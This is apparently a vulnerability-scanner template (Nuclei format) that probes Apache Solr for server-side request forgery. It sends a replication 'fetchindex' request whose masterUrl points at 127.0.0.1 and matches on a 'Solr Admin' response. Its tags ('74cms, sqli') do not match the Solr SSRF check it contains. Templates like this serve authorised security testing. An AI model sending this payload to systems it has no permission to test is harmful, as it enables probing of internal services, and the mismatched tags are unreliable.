id: apache-solr-ssrf

info:
  name: apache-solr-ssrf
  author: str1am
  severity: high
  reference:
    - http://www.2cto.com/article/201405/304552.html
  tags: 74cms,sqli

requests:
  - method: GET
    path:
      - "/solr/db/replication?command=fetchindex&masterUrl=http://127.0.0.1&wt=json&httpBasicAuthUser=&httpBasicAuthPassword="

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "Solr Admin"

      - type: status
        status:
          - 200